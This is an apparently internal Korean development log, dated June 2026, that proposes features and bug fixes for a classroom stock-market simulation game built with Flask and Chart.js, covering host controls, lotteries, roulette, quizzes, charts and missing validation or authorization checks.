- **진행자 "종목 개별 잠금" 기능** (`stock_service.py:174-190`, `app.py:673-687`): 현재 시장 이벤트는 섹터 전체 가격을 한 번에 움직이지만, 특정 종목만 수업 주제로 부각시키기 위해 해당 종목 가격을 일정 시간 고정하는 기능이 없음. `StockService`에 `_locked_until: dict[str, float] = {}` 필드를 추가하고, `tick()` 내 가격 업데이트 시 `if time.time() < self._locked_until.get(sym, 0): continue` 한 줄로 건너뜀. 잠금 해제 POST 엔드포인트(`/api/rooms/<rid>/host/lock-stock`) 하나와 호스트 UI 토글 버튼만 추가하면 완성. 학생들에게 "이 종목은 지금 거래 동결 중" 안내도 가능해짐.

- **학생별 투자 성향 분석 뱃지** (`models.py:68-79`, `app.js:1694`): 게임 종료 후 결과 화면에서 `RoomTransaction` 패턴을 분석해 "단타형(평균 보유 시간 < 5분)", "분산형(3개 이상 종목 보유)", "집중형(한 종목 비중 70% 이상)" 같은 투자 성향 뱃지를 표시함. 서버 측 `/api/rooms/<rid>/my-analysis` 엔드포인트에서 `RoomTransaction.query.filter_by(room_id=rid, user_id=uid)` 조회 후 집계, 또는 `loadResults()` 내에서 이미 있는 `S.txns` 배열로 클라이언트 계산 가능. 추가 DB 쿼리 없이 기존 데이터로 구현 가능하며 수업 마무리 토론 자료로 활용됨.

- **거래 내역에 현재가 대비 수익률 표시** (`app.js:1569-1591`): `loadTxn()`에서 거래 목록을 렌더링할 때 `t.price`(체결가)와 `S.stocks.find(s => s.symbol === t.symbol)?.price`(현재가)를 비교해 `((현재가 - 체결가) / 체결가 * 100).toFixed(1)%` 값을 각 거래 행에 작은 뱃지로 표시함. BUY 거래에는 현재 평가 손익이, SELL 거래에는 매도 후 주가 변동이 보여 "팔고 나서 더 올랐다" 같은 학습 포인트를 즉시 시각화할 수 있음. 이미 `S.stocks`가 폴링으로 최신 상태이므로 추가 API 호출 없이 구현 가능.

- **진행자 시장 탭 종목별 보유 학생 수 표시** (`app.py:651-671`, `models.py:57-65`): `/api/rooms/<rid>/stocks` 응답에 `holder_count` 필드를 추가함. `db.session.query(RoomHolding.symbol, func.count(RoomHolding.user_id)).filter(RoomHolding.room_id == rid, RoomHolding.shares > 0).group_by(RoomHolding.symbol).all()` 단일 쿼리로 전 종목의 보유자 수를 한 번에 조회해 딕셔너리로 변환한 뒤 stocks 리스트에 병합. 진행자 화면 종목 카드에 "N명 보유" 뱃지를 띄우면 "가장 인기 있는 종목" 현황을 실시간으로 파악하고 수업 포인트로 활용 가능.

- **게임 중 목표 수익률 달성 알림** (`app.js:735-753`): `localStorage.setItem('gain-target-' + S.room.id, threshold)` 로 룸별 목표 수익률을 저장하고, `refreshMyRank()` 내 `me.gain_pct`가 임계값을 최초로 넘는 순간 `toast('🎯 목표 달성!')` + `navigator.vibrate?.([200])` 을 호출함. `S._gainTargetNotified` 플래그로 중복 알림 방지. 서버 변경 없이 10줄 이내로 구현 가능하며, 수업 전 교사가 "오늘의 목표: +10%" 같은 미션을 제시할 때 즉각적인 피드백을 제공함.

- **`loadPortfolio()` 도넛 차트 `update()` 패턴으로 교체** (`app.js:1486-1510`): `if (S.portChart) S.portChart.destroy(); S.portChart = new Chart(ctx, {...})` 패턴이 포트폴리오 탭 진입마다 실행됨. `S.portChart`가 이미 존재할 때는 `S.portChart.data.labels = labels; S.portChart.data.datasets[0].data = values; S.portChart.update()` 로 데이터만 교체하면 DOM 재생성 없이 애니메이션과 함께 부드럽게 업데이트됨. `loadChart()` (`app.js:1376`)도 동일한 패턴으로 고쳐야 하며, 두 곳 모두 수정하면 차트 깜빡임과 메모리 누수가 동시에 제거됨.

---

### 제거/단순화할 것들

- **`host_market_event()` 에서 뉴스 캐시 무효화 누락** (`app.py:1345-1360`): `stock_service.force_sector_event()` 내부에서 `self._news`를 업데이트(`stock_service.py:244-276`)하지만, `app.py:1360` 반환 전에 `_invalidate_news_cache(rid)` 호출이 없음. `host_send_news()` (`app.py:700`)는 동일 함수를 호출하는데 반해 누락된 것. 결과적으로 섹터 이벤트 직후 학생 클라이언트는 최대 2초간 구 뉴스를 읽음. `return jsonify({'ok': True})` 바로 위에 `_invalidate_news_cache(rid)` 한 줄 추가로 수정.

- **`lottery_start()` 중복 시작 방지 체크가 `_lottery_lock` 바깥에서 실행됨** (`app.py:1088-1090`): `lot.get('current')` 확인 후 `lot['current'] = {...}` 할당까지의 과정이 `_lottery_lock` 획득 전에 이루어짐. 두 요청이 동시에 None 체크를 통과하면 복권 라운드가 중복 시작됨(네트워크 재시도·이중 클릭 상황). 라인 1088 check와 1094 assignment를 모두 `with _lottery_lock:` 블록 안으로 이동시켜야 함. 현재 lock은 라인 1092에서만 진입하므로, 전체 체크+할당 구간을 하나의 `with` 블록으로 감싸도록 수정 필요.

- **`loadChart()` 기간 탭 클릭마다 Chart.js 인스턴스 파괴 후 재생성** (`app.js:1376`): `if (S.stockChart) S.stockChart.destroy(); S.stockChart = new Chart(ctx, cfg)` 가 1d/5d/1mo/3mo 탭 전환 때마다 실행됨. 이미 `renderHostBarChart()`에 적용된 `chart.data.labels = ...; chart.data.datasets[0].data = ...; chart.update()` 패턴으로 교체하면 탭 전환 시 깜빡임이 없어지고 GC 압력도 줄어듦. 색상(상승·하락 borderColor)만 `chart.data.datasets[0].borderColor = color; chart.data.datasets[0].backgroundColor = color + '33'` 으로 별도 갱신하면 됨.

- **`minigame_spin()` 예금 부분 차감 후 이자 계산 기반 오류** (`app.py:1048-1058`): 현금 부족 시 `dep.amount -= take` 로 원금만 줄이고 `dep.status`는 `'active'`로 유지함. `_end_room()` 에서 이자를 `d.amount * d.rate / 100 * ratio` (`app.py:140`)로 계산하므로 차감된 원금에만 이자가 붙어 학생이 원래 예금한 금액 대비 과소 이자를 받음. 수정 방법: 기존 `Deposit`을 `'withdrawn'`으로 닫고, 남은 금액(`dep.amount - take`)으로 새 `Deposit`을 `created_at=now`로 생성하면 이자 계산 기반이 정확해짐. 또는 부분 차감을 허용하되 `interest_base` 컬럼을 별도 관리하도록 모델 변경 필요.

- **`get_stocks()` 방 소속 검증 없어 타 방 주가 열람 가능** (`app.py:651-654`): `@login_required` 만 적용되어 있어 로그인한 모든 사용자가 임의의 `rid`로 `GET /api/rooms/<rid>/stocks` 를 호출해 해당 방의 실시간 시뮬레이션 주가를 읽을 수 있음. 방마다 독립적으로 가격이 형성(`stock_service.py:80-130`)되므로 정보 비대칭 발생 우려가 있음. `Room.query.get_or_404(rid)` 직후 `if not (room.host_id == cur_user().id or RoomMember.query.filter_by(room_id=rid, user_id=cur_user().id).first()): return jsonify({'error': '권한 없음'}), 403` 조건을 추가해야 함.

- **`RoomTransaction.action` 컬럼 길이가 4자로 제한되어 'LOTTO' 저장 불가** (`models.py:73`): `db.Column(db.String(4))` 로 선언되어 있어 'BUY'·'SELL'·'ADJ'는 저장되지만, 복권 당첨 트랜잭션 종류를 'LOTTO'(5자)로 추가하려면 마이그레이션 필요. 현재는 복권 당첨금을 `action='ADJ'`, `note='복권 당첨'`으로 우회 저장 중(`app.py:1143`)이어서 거래 유형 필터링이 불가능함. `db.String(10)` 으로 늘리고 전용 `action='LOTTO'` 값을 사용하면 거래 내역 조회·엑셀 내보내기 시 복권 수익을 명확히 구분할 수 있음.

---

## 2026-06-25

### 추가하면 좋을 기능

- **룰렛 베팅 초과 시 주식 자동 청산 사전 경고 모달** (`app.py:1022-1058`, `app.js:1033-1048`): 현금이 부족할 때 `minigame_spin()`이 서버 측에서 보유 주식을 자동 매도하여 베팅금을 충당함. 그러나 프론트엔드는 이 사실을 알리지 않고 바로 스핀 요청을 전송함(`app.js:1048` → `api('POST', ...)`). 주식이 청산된 학생은 자신이 왜 주식을 잃었는지 모름. 베팅 확인 모달(`index.html`의 룰렛 BET 버튼 로직)에 "현금이 부족하면 보유 주식이 자동 매각됩니다" 경고 문구를 추가하고, 서버 응답에 `sold_stocks: [{symbol, shares, price}]` 필드를 포함시켜 청산된 내역을 팝업으로 보여줘야 함.

- **진행자 시장 탭 섹터/종목 검색 필터** (`app.js:314-358`, `index.html:161-208`): 참가자 화면에는 섹터 필터 버튼이 구현되어 있지만 진행자의 시장 탭(`renderHostMarket()`, `app.js:314`)에는 없어 47개 종목이 모두 나열됨. 진행자가 특정 종목의 시세를 빠르게 확인하거나 강제 조작(`host_force_price()`)할 종목을 찾으려면 스크롤을 해야 함. 참가자 탭의 섹터 필터(`app.js:2088-2120`)와 검색 인풋 로직을 `renderHostMarket()`에도 동일하게 적용하면 됨.

- **퀴즈 일시 비활성화 토글** (`app.py:1248-1270`): 게임 진행 중 진행자가 수업 흐름에 따라 퀴즈를 잠깐 꺼두고 싶을 때 방법이 없음. 현재는 퀴즈를 시작하면(`quiz_start()`, `app.py:1270`) 종료 전까지 학생이 언제든 답할 수 있음. `_quiz_state[rid]`에 `'paused': True` 플래그를 추가하고, `quiz_answer()`(`app.py:1290`)에서 해당 플래그를 확인해 일시 중지 중에는 접수를 거부하면 됨. 진행자 UI에 "퀴즈 일시중지" 버튼을 추가해 제어 가능하게 할 것.

- **룰렛 자동 닫기 타이머가 결과 확인 중에도 계속 진행** (`app.js:972-997`, `app.js:1090-1095`): 룰렛 모달이 열릴 때 60초 자동 닫기 타이머(`_rltAutoCloseTimer`)가 시작됨. 스핀 애니메이션이 끝나고 결과 메시지가 표시되는 동안에도 타이머는 계속 돌아서, 학생이 결과를 읽다가 모달이 갑자기 닫힐 수 있음. 결과가 표시되는 시점(`app.js:1090`의 `showRltResult()` 호출 시)에 기존 타이머를 `clearTimeout(_rltAutoCloseTimer)`로 취소하고, 결과 확인 후 30초의 새 타이머를 재시작하도록 수정해야 함.

- **복권 상금 기본값이 학생 수 × 3천만 원으로 비현실적** (`app.py:418-419`, `app.js:2041-2042`): `lottery_start()` 기본 상금은 `member_count * 30_000_000`으로, 30명 참가 시 9억 원이 기본값으로 설정됨. 수업 시작금(기본 1,000만 원)보다 훨씬 크기 때문에 복권 한 번으로 순위 역전이 발생하고 게임 밸런스가 깨짐. 기본값을 `starting_cash * 0.1`(시작금의 10%) 정도로 낮추거나, 상금 입력 필드에 권장 범위 안내 문구를 표시할 것.

### 제거/단순화할 것들

- **`api` 래퍼가 HTTP 오류 시 서버의 실제 오류 메시지를 버림** (`app.js:29-45`): `if (!r.ok) return {error: 'HTTP ${r.status}'}` 로 하드코딩된 문자열을 반환하므로, Flask가 `jsonify({'error': '현금이 부족합니다'})` 를 보내도 화면에는 "HTTP 400"만 표시됨. `r.json().catch(...)` 로 서버 JSON을 먼저 파싱한 뒤 `body.error || 'HTTP ${r.status}'` 를 사용하면 학생이 왜 거래가 실패했는지 즉시 알 수 있음. 단 3줄 수정으로 UX가 크게 개선됨.

- **`_news_cache` TTL(2초)과 프론트엔드 뉴스 폴링 주기(8초) 불일치** (`app.py:69`, `app.js:810`): 뉴스 캐시 만료(2초)가 훨씬 빠르기 때문에 8초마다 오는 폴링 요청은 항상 캐시 미스 상태에서 처리됨. `_news_cache` TTL을 `NEWS_CACHE_TTL = 8`로 올리거나(폴링 주기와 맞춤), 뉴스는 가격 변동 시에만 갱신되므로 `_invalidate_news_cache(rid)`를 호출하는 시점(`stock_service.py`의 `tick()` 완료 후)에만 캐시를 갱신하는 방식으로 단순화하면 캐시가 실질적으로 동작하게 됨.

- **`host_adjust()` 와 `lottery_skip()` 의 숫자 변환에 try/except 없음** (`app.py:592`, `app.py:1215`): `delta = float(d.get('delta', 0))`와 `round_n = int(d.get('round', 1))`는 프론트엔드가 비정상 값을 보내면 `ValueError`를 발생시켜 500 에러로 이어짐. 각 줄을 `try/except ValueError: return jsonify({'error': '잘못된 입력'}), 400` 으로 감싸면 됨. 두 곳 모두 5줄 미만의 수정으로 방어 가능.

- **`RoomTransaction`의 `symbol` 컬럼에 'DEPOSIT'·'ROULETTE'·'LOTTERY' 더미값 혼재** (`app.py:600`, `app.py:1064`, `app.py:1143`): 예금·룰렛·복권 거래는 실제 종목 심볼 대신 더미 문자열을 `symbol`에 저장함. 이 때문에 거래 내역 화면에서 종목 차트를 클릭하거나 필터할 때 존재하지 않는 심볼이 섞임. `symbol` 컬럼을 nullable로 변경하고(`db.Column(db.String(20), nullable=True)`), 종목 무관 거래는 `symbol=None`으로 저장한 뒤 UI에서 None인 경우 심볼 대신 거래 유형 레이블을 표시하도록 정리할 것.

- **`refreshMyRank()` 가 전체 순위 배열을 받아 자기 항목만 추출** (`app.js:735-753`): 30명 방에서 `/api/rooms/<rid>/rankings` 전체를 10초마다 받아 `find()`로 내 항목만 꺼냄. 참가자가 순위 탭을 보지 않아도 폴링됨. 백엔드에 `GET /api/rooms/<rid>/my_rank` 엔드포인트를 추가해 본인 순위·자산만 반환하거나, 순위 탭이 열려 있을 때만 전체 순위를 요청하는 조건을 추가하면 불필요한 DB 쿼리를 줄일 수 있음.

---

## 2026-06-25 (2차)

### 추가하면 좋을 기능

- **시장 탭 상단 가로 스크롤 주가 티커 마퀴** (`app.js:1229-1270`, `static/css/style.css`): `loadMarket()` 이후 이미 `S.stocks` 배열에 모든 종목 현재가·등락률이 담겨 있음. 이 데이터를 활용해 상승/하락 상위 10개 종목을 CSS `@keyframes marquee` + `overflow: hidden` 컨테이너로 횡스크롤 표시하면 서버 변경 없이 실시간 주가 흐름을 한눈에 볼 수 있음. `renderGrid()` 호출 직후 `updateTicker(S.stocks)` 를 추가하고 10줄 이내의 JS + CSS로 구현 가능.

- **게임 중 진행자 예금 금리 실시간 변경 이벤트** (`app.py:878-903`, `models.py:82-92`): 현재 `deposit_rate`는 방 생성 시 설정되면 변경 방법이 없음. `Deposit.rate`는 가입 시점에 복사 저장되므로(`models.py:88`) 기존 예금에는 영향이 없고 새 예금에만 신규 금리가 적용됨. `POST /api/rooms/<rid>/host/deposit-rate` 엔드포인트를 추가해 `room.deposit_rate`를 갱신하고, 진행자 UI에 슬라이더를 노출하면 중앙은행 기준금리 결정 수업 시나리오를 실제 게임 안에서 구현할 수 있음.

- **게임 결과 화면 투자 스타일 자동 라벨링** (`app.py:808-824`, `app.py:1417-1488`): 게임 종료 후 `RoomTransaction` 기록을 분석해 거래 횟수·섹터 집중도·평균 보유 기간 지표를 산출하고 학생마다 "단타형 🔥"(50회 이상 거래), "장기보유형 💎"(평균 보유 5분 이상), "분산투자형 🌈"(5개 섹터 이상), "예금형 🏦"(현금 80% 이상)과 같은 레이블을 붙이면 됨. `get_rankings()` 응답에 `style_label` 필드를 추가하고 결과 화면 및 Excel 내보내기에 반영.

- **포트폴리오 탭 섹터별 비중 도넛 차트 토글** (`app.js:1456-1510`): 현재 포트폴리오 도넛 차트는 종목 단위로만 표시됨. 보유 종목의 `sector` 필드(`stock_service.py`의 `STOCKS` 딕셔너리에 있음)를 그룹화해 섹터별 비중으로 전환하는 "섹터별 보기" 버튼을 추가하면 됨. 서버 변경 없이 Chart.js `data.labels`와 `data.datasets[0].data`만 교체하는 10줄 수정으로 구현 가능하며, 포트폴리오 분산도를 직관적으로 파악할 수 있음.

- **진행자 특정 종목 서킷브레이커(거래 정지)** (`stock_service.py`, `app.py`): `StockService`에 `_halted: set` 속성을 추가하고 `freeze_symbol(rid, sym)` / `unfreeze_symbol(rid, sym)` 메서드를 구현. `app.py`의 `trade()` 엔드포인트에서 해당 심볼이 정지 목록에 있으면 `{'error': '거래 정지 종목입니다'}, 403` 반환. `get_stocks()` 응답에 `trading_halted: bool` 필드 포함. 진행자 호스트 시장 탭에서 종목별 정지 토글 버튼 노출. 주식시장 서킷브레이커 개념을 실습할 수 있음.

- **종목 카드 롱프레스 1주 즉시 매수** (`app.js:1287-1324`): `renderGrid()` 에서 생성되는 종목 카드에 `touchstart` 이벤트 핸들러를 등록해 500ms 이상 유지 시 모달 없이 `execTrade('BUY', symbol, 1)`을 직접 호출하는 기능. `localStorage`에 `quickBuyEnabled` 플래그를 두어 선택적으로 활성화. 수업 중 빠르게 1주씩 모아가는 장기투자 시나리오에서 모달 클릭 반복 없이 편리하게 매수할 수 있음.

### 제거/단순화할 것들

- **`create_room()` `starting_cash` 상한값 누락** (`app.py:384-385`): `starting_cash = max(100000, float(d.get('starting_cash', 10_000_000)))` 로 하한(10만)은 있지만 상한이 없음. 진행자가 1조 원을 입력하면 순위 표·Excel 컬럼 너비가 깨지고 소수점 float 정밀도 문제가 증폭됨. `min(starting_cash, 1_000_000_000)` 을 추가하고 HTML `<input max="1000000000">` 속성도 함께 설정할 것.

- **`lobby_members()` 유저 조회 N+1 쿼리** (`app.py:577-585`): `for m in members: db.session.get(User, m.user_id)` 를 멤버 수만큼 반복 실행함. 같은 파일의 `host_members()` (`app.py:550`)는 이미 `user_map = {u.id: u for u in db.session.query(User).filter(User.id.in_(uids)).all()}` 패턴으로 배치 조회함. `lobby_members()`도 동일 패턴으로 교체하면 30명 방 기준 DB 왕복 29회를 절감.

- **`doRouletteSpin()` 결과 수신 후 `_rltCash` 경쟁 조건** (`app.js:1064-1068`): 스핀 성공 시 `_rltCash = data.cash` (현금만)로 즉시 갱신한 뒤, 비동기로 `api.get(minigame)` 를 불러 `_rltCash = data.total_assets` 로 재갱신함. 이 짧은 사이에 `setRltPct(pct)` (`app.js:1028`)가 호출되면 보유 주식 평가액이 제외된 값으로 베팅 금액을 계산해 실제보다 낮은 금액이 입력됨. 베팅 컨트롤 재활성화를 minigame 재조회 완료 후로 미루거나 `await` 체인으로 순서를 보장해야 함.

- **`get_history()` `interval` 파라미터가 실제로 무시됨** (`stock_service.py:296-297`): `step = 86400` 이 고정값으로 사용되어 `interval='5m'`이든 `'1wk'`이든 항상 1일 간격으로 캔들이 생성됨. 프론트엔드가 "1일·1달·1년" 탭을 제공하지만 모든 탭의 차트가 동일하게 보임. `step_secs = {'5m': 300, '30m': 1800, '1d': 86400, '1wk': 604800}.get(interval, 86400)` 로 매핑한 뒤 `now - i * step_secs` 로 교체하면 탭별 다른 시간 해상도를 제공할 수 있음.

- **`startTimer()` 클라이언트 시계 의존으로 드리프트 발생** (`app.js:756-776`): `rem = Math.floor((new Date(S.room.end_time) - new Date()) / 1000)` 는 학생 기기의 시스템 시계를 그대로 사용함. 기기 시계가 ±1~2분 오차가 있으면 게임 내내 타이머가 다르게 표시됨. 서버가 이미 `room_dict()`에서 `remaining_seconds`를 계산해 반환하므로(`app.py` 내 `room_dict` 함수), 폴링 응답의 `remaining_seconds`와 클라이언트 측 경과 시간을 합산하는 `S.serverTimeOffset` 보정값을 도입하면 시계 오차를 제거할 수 있음.

- **호스트 폴링에서 `loadHostMembers()`와 `refreshRoomStatus()` 동시 실행으로 `S.room` 갱신 경쟁** (`app.js:269-273`, `app.js:1180-1207`): 호스트 `setInterval` 콜백이 두 함수를 `await` 없이 연속 호출해 둘 다 비동기로 실행됨. 응답 순서에 따라 먼저 도착한 `refreshRoomStatus()` 결과가 더 늦게 도착한 `loadHostMembers()` 의 부수 갱신을 덮어쓸 수 있음. 두 호출을 `await loadHostMembers(); await refreshRoomStatus();` 로 직렬화하거나 단일 엔드포인트로 통합해야 함.

---

## 2026-06-26

### 추가하면 좋을 기능

- **복권 오버레이 picking/waiting 상태에서 닫기 버튼 없음** (`index.html:476-509`, `app.js closeLotteryOverlay()`): `lottery-overlay`의 `lot-section-result`에만 닫기 버튼이 있고 `lot-section-picking`·`lot-section-waiting` 섹션에는 없음. 복권 도중 서버 에러나 네트워크 단절이 발생하면 참가자 화면이 오버레이에 고착됨. 각 섹션에 `closeLotteryOverlay()`를 호출하는 "닫기" 버튼(또는 ESC 키 핸들러)을 추가하고, 복권 진행 중에는 버튼을 비활성화(disabled)하되 5초 이상 응답이 없을 때 활성화하는 타임아웃 로직을 함께 추가하면 됨.

- **결과 화면에 "새 게임 만들기" 바로가기 버튼 누락** (`index.html:596-637`): 게임 종료 후 `screen-results`에는 "홈으로" 버튼(`id="btn-results-home"`)만 있어 교사가 연속 수업 시 홈 → 방 만들기 2단계를 거쳐야 함. `btn-results-home` 옆에 `doCreateRoom()` 또는 `showScreen('screen-host-create')`를 직접 호출하는 "새 게임 만들기" 버튼을 추가하면 1단계로 단축됨. 서버 변경 없이 HTML과 app.js 10줄 이내 수정으로 구현 가능.

- **`enterHostGame()` 에서 퀴즈 설정 미로드** (`app.js:258-274`): `enterHostGame()`은 `loadRltConfig()`를 호출해 룰렛 설정을 복원하지만 `GET /api/rooms/<rid>/host/quiz-settings`(`app.py:1399`)에 대응하는 `loadQuizSettings()` 호출은 없음. 호스트가 새로고침 또는 재접속하면 이전에 저장한 퀴즈 문제·보기가 기본값으로 초기화되어 표시됨. `loadRltConfig()` 패턴과 동일하게 `loadQuizSettings()` 함수를 추가하고 `enterHostGame()` 초기화 시퀀스에 포함시키면 됨.

- **진행자 로비 화면 뒤로가기/취소 버튼 없음** (`index.html:81`): `screen-host-lobby`의 상단 좌측 `<span></span>`이 비어 있어 진행자가 방을 잘못 만들었을 때 취소 방법이 없음. 참가자 화면의 "← 나가기" 패턴과 동일하게 방 코드를 무효화(`DELETE /api/rooms/<rid>`) 또는 단순히 랜딩 화면으로 복귀하는 버튼을 추가해야 함. 단, 참가자가 이미 입장한 경우에는 경고 확인 다이얼로그를 표시하도록 구현해야 함.

- **종목 그리드 정렬 옵션 없음** (`app.js:1257-1270`): `renderGrid()`는 서버에서 반환된 순서(`STOCKS` 딕셔너리 선언 순서)를 그대로 표시함. 변동률 높은 종목·낮은 종목·가격순·섹터별 정렬이 없어 학생이 수동으로 스캔해야 함. 헤더 영역에 정렬 드롭다운(`변동률 ↑↓ / 가격 ↑↓ / 이름순`)을 추가하고 `S.stocks` 배열을 `sort()` 후 `renderGrid()`를 재호출하는 방식으로 서버 변경 없이 구현 가능.

- **참가자가 일시정지 상태인 방에 입장 시 paused 배너 최대 10초 지연** (`app.js:589-651`): `enterParticipantGame()` 함수가 반환된 직후 `S.room.status === 'paused'`를 확인해 `showPausedBanner()`를 즉시 호출하는 코드가 없음. 일시정지 중인 방에 늦게 입장한 학생에게 첫 폴링 사이클(최대 10초)이 완료될 때까지 배너가 보이지 않음. `enterParticipantGame()` 마지막에 `if (S.room.status === 'paused') showPausedBanner();` 한 줄 추가로 해결됨.

### 제거/단순화할 것들

- **`host_force_price()` 0% 입력 검증 누락** (`app.py:682`): `host_market_event()`(`app.py:1355`)는 `if pct == 0: return error` 체크가 있지만, `host_force_price()`의 `abs(pct) > 50` 체크는 `pct == 0`을 통과시킴. 0%로 가격을 강제 설정하면 `force_price()`가 현재가 × 1.0을 저장해 변화는 없지만 불필요한 뉴스 항목이 생성되고 DB 쓰기가 발생함. `if pct == 0: return jsonify({'error': '0%는 입력할 수 없습니다'}), 400` 을 `abs(pct) > 50` 검사 앞에 추가해야 함.

- **`host_adjust()` delta=0 허용으로 빈 트랜잭션 생성** (`app.py:596-603`): `delta = float(d.get('delta', 0))` 이후 0 검증 없이 `amount = delta`, `RoomTransaction(..., amount=0)` 이 기록됨. 0원 조정은 현금도 변하지 않고 거래 내역에 혼란만 유발함. `if delta == 0: return jsonify({'error': '조정 금액을 입력하세요'}), 400` 을 추가해 의미 없는 트랜잭션 생성을 막아야 함.

- **`Apple` 종목 심볼 오타 `APPL` → `AAPL`** (`stock_service.py:78`): `STOCKS` 딕셔너리에서 Apple의 키가 `'APPL'`로 선언되어 있음. 실제 나스닥 티커는 `AAPL`이며, 학생들이 실제 증시와 비교 학습 시 혼란을 유발함. 단순 키 이름 변경이지만 이미 저장된 `RoomHolding.symbol` 값과 불일치가 생길 수 있으므로, DB 마이그레이션(`UPDATE room_holdings SET symbol='AAPL' WHERE symbol='APPL'`) 또는 `STOCKS`에 `'APPL'` 별칭 유지 후 신규 방부터만 `AAPL` 사용하는 방법 중 선택해야 함.

- **`setDepPct()` 소액 현금 시 전 버튼 0원 반환** (`app.js:1596-1601`): `Math.floor(cash * pct / 100 / 10000) * 10000` 계산으로 현금이 10,000원 미만이면 25%·50%·75%·100% 모두 0을 반환함. 입금 버튼을 눌러도 아무 일도 없어 학생이 버튼이 고장난 것으로 오해함. `Math.max(1, Math.round(cash * pct / 100))` 으로 교체하거나, 가용 현금이 10,000원 미만일 때 버튼에 "잔액 부족" 툴팁을 노출하는 방식으로 UX를 개선해야 함.

- **서버 재시작 시 복권 `active` 상태 유실로 방 고착 가능** (`app.py:165-166`, `app.py:409-430`): `_lots` 딕셔너리가 in-memory에만 존재해 서버 재시작(Render 슬립→웨이크업 포함) 시 초기화됨. 복권 진행 중 서버가 재시작되면 `_lots` 키가 없어 `GET /api/rooms/<rid>/lottery` 가 빈 응답을 반환하고, 참가자 화면은 폴링으로 `status: null`을 받아 복권 오버레이가 닫히지 않는 상태가 될 수 있음. 단기 해결책으로 `Room.lottery_rounds_done` 필드처럼 `_lots` 상태를 DB 컬럼(`Room.lottery_state TEXT`)에 JSON 직렬화해 재시작 후 복원하거나, 서버 재시작 감지 시 진행 중 복권을 자동 종료(skip)하는 로직을 추가해야 함.

---

## 2026-06-26 (2차)

### 추가하면 좋을 기능

- **API 401 응답 전역 처리 없어 세션 만료 시 화면 고착** (`app.js:29-45`): `api.get/post` 함수가 HTTP 401을 받으면 `{error: 'HTTP 401'}`을 반환하지만 이를 전역에서 처리해 랜딩 페이지로 복귀하는 코드가 없음. 서버 재시작·쿠키 삭제 등으로 세션이 만료되면 10초 폴링이 계속 401을 받으면서도 학생 화면은 게임 중 상태로 고착되고 오류 메시지 없이 데이터만 사라짐. `api.get/post` 안에 `if (r.status === 401) { showLanding(); toast('세션이 만료되었습니다. 다시 입장해주세요.', 'warn'); return {error: 'session'}; }` 처리를 추가하면 5줄로 해결 가능하며, 서버 재시작이 잦은 Render 무료 티어 환경에서 특히 중요.

- **보유 종목 주식 차트 모달에 매수 평균가 수평선 미표시** (`app.js:1344-1398`): `openStockModal()`에서 포트폴리오 API를 호출해 `S.tradeHolding`과 `avg_price`를 이미 알고 있지만, `loadChart()`가 생성하는 Chart.js 라인 차트에 매수 평균가 수평선이 없어 학생이 차트 상에서 수익/손실 여부를 바로 파악하기 어려움. `datasets`에 `{data: Array(labels.length).fill(port.avg_price), borderColor: '#e3b341', borderDash: [4,4], pointRadius: 0, label: '평균매수가'}` 두 번째 데이터셋을 추가하면 서버 변경 없이 Chart.js 기본 기능만으로 구현 가능. 주식을 보유하지 않은 경우에는 데이터셋을 추가하지 않도록 분기 처리.

- **`doJoinRoom()` `is_host` 체크 없어 진행자가 자신의 방에 학생으로 오입장** (`app.js:143-169`): 진행자가 실수로 자신의 방 코드를 '방 참가' 경로로 입력하면 서버는 `is_host: true`인 `room_dict`를 반환하지만, `doJoinRoom()` 내 `if (S.room.status === 'active') { enterParticipantGame(); }` 분기가 `is_host` 체크 없이 학생 화면으로 진입시킴. 진행자가 학생 화면에 갇혀 순위 조정·강제 시세·게임 종료 등 모든 호스트 기능을 잃음. `doJoinRoom()` 반환 직전 `if (S.room.is_host) { resumeRoom(); return; }` 두 줄만 추가하면 올바른 진행자 화면으로 리디렉트됨.

- **`doEndGame()` confirm 다이얼로그 누락** (`app.js:540-552`): `doStartGame()` (`app.js:247`)에는 `if (!confirm('게임을 시작하시겠습니까?')) return;` 가드가 있지만, `doEndGame()`은 confirm 없이 즉시 API를 호출함. 진행자가 실수로 종료 버튼을 클릭하면 1분 카운트다운이 바로 시작되고 취소할 수 없음. `doEndGame()` 첫 줄에 `if (!confirm('게임을 종료하시겠습니까? 1분 카운트다운이 시작됩니다.')) return;` 한 줄 추가 권장.

- **게임 종료 후 진행자 화면에 전체 통계 요약 패널 없음** (`app.py:808-824`, `app.py:829-847`): 결과 화면에는 순위표만 있고 "총 거래 건수", "가장 많이 거래된 종목", "전체 평균 수익률", "가장 활발한 학생"과 같은 수업 마무리 통계가 없음. `GET /api/rooms/<rid>/summary` 엔드포인트를 추가해 `RoomTransaction`과 `RoomMember` 테이블 집계 결과 `{total_trades, top_symbol, avg_gain_pct, most_active_username}`를 반환하면 됨. 기존 `export_rankings()` · `get_rankings()` 와 거의 동일한 쿼리 패턴으로 ~40줄 구현 가능하며, 수업 종료 토론에서 즉시 활용 가능.

- **복권 결과 닫기 후 `_lotResultRound` 미갱신으로 동일 회차 재폴링 가능** (`app.js:588-650`): 참가자 폴링 루프에서 `r.lottery_active && !_lotPollInterval && _lotResultRound !== r.lottery_current_round` 조건으로 복권 폴링을 시작함. `_startLotPolling()` 완료 또는 결과 확인 시 `_lotResultRound`가 설정되지만, 오버레이 강제 닫기·네트워크 오류 등으로 `_stopLotPolling()` 없이 오버레이만 닫히면 `_lotResultRound`가 갱신되지 않아 다음 10초 폴링에서 같은 회차에 대한 복권 오버레이가 다시 열릴 수 있음. `closeLotteryOverlay()` 함수 안에서 `_lotResultRound = S.room.lottery_current_round` 를 명시적으로 설정하는 방어 코드를 추가 권장.

---

### 제거/단순화할 것들

- **`loadPortfolio()`·`loadChart()` 매번 Chart.js destroy/recreate** (`app.js:1375`, `app.js:1486`, `app.js:1509`): `S.portChart.destroy()`, `S.assetLineChart.destroy()`, `S.stockChart.destroy()` 가 포트폴리오 탭 진입·주식 모달 열기·기간 탭 전환 시마다 반복됨. `S.hostBarChart` (`app.js:440-447`)는 이미 `.data.labels`, `.data.datasets[0].data` 교체 후 `.update()` 를 호출하는 패턴으로 깜빡임 없이 갱신됨. 세 차트도 동일 패턴으로 교체하면 매번 발생하는 DOM 생성·소멸 비용이 사라지고 차트 전환 시 부드러운 애니메이션을 얻을 수 있음.

